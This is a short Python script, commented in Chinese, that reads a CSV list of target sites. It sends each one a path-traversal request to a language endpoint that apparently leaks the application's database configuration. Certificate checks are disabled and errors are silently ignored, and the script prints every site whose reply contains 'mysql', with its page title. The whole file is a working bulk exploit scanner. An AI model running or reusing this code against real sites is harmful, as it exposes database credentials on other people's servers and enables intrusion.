import requests
import urllib3
from bs4 import BeautifulSoup 
def get_website_title(url):  
    # 发送GET请求  
    response = requests.get(url)  
    # 确保请求成功  
    if response.status_code == 200:  
        # 使用BeautifulSoup解析HTML内容  
        soup = BeautifulSoup(response.text, 'html.parser')  
        # 查找<title>标签并获取其内容  
        title = soup.title.string if soup.title else "No title found"  
        return title  
    else:  
        return "Failed to retrieve the webpage"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
open_file = open("资产数据.csv", "r") 
a = 0
for line in open_file:
    host,link = line.strip().split(",")
    try:
        r = requests.get(link+"/index/ajax/lang?lang=../../application/database", timeout=5,verify=False)
        if "mysql" in r.text:
            print(link,get_website_title(link))
    except:
        pass